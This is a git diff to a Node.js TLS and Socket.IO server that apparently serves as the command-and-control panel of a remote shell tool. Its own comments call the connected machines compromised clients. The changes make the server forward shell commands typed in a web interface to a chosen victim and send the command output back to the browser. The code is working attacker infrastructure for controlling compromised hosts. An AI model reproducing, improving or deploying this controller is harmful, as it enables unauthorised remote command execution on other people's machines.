@@ -42,13 +42,16 @@ var server = tls.createServer(options, (client) => {
 
     // Add the client into the "clients" object and use their unique ID as the key to access the client
     clients[client.connID] = client
-    client.write(chalk.green(`1Connected! Your id is ${client.connID}\r\n`))
+    //client.write(chalk.green(`1Connected! Your id is ${client.connID}\r\n`))
 
     // Dump data from any client to console along with their ID
     client.on('data', (data) => {
-        console.log(`From Client (${client.connID}):\n ${data.toString()}`)
+        //console.log(`From Client (${client.connID}):\n ${data.toString()}`)
 
-        ioclients[client.connID].emit('cmdRes', data.toString())
+        if (ioclients[client.connID]) {
+            ioclients[client.connID].emit('cmdRes', data.toString())
+        }
+        //Socketio not connected, goes to void
         /**
          * SEND RESPONSE FROM COMPROMISED CLIENT TO SOCKET IO CLIENT (WEB) FROM HERE
          */
@@ -119,7 +122,8 @@ io.on('connection', (socket) => {
         console.log(`running: ${JSON.stringify(data)}`)
         client = clients[data.clientId]
         if (client) {
-            client.write('0' + data.shellInput.substr(0))
+            client.write(data.shellInput+'\n')
+            //client.write('0' + data.shellInput.substr(0))
         } else {
             socket.emit('cmdRes', 'Requested client could not be found')
         }
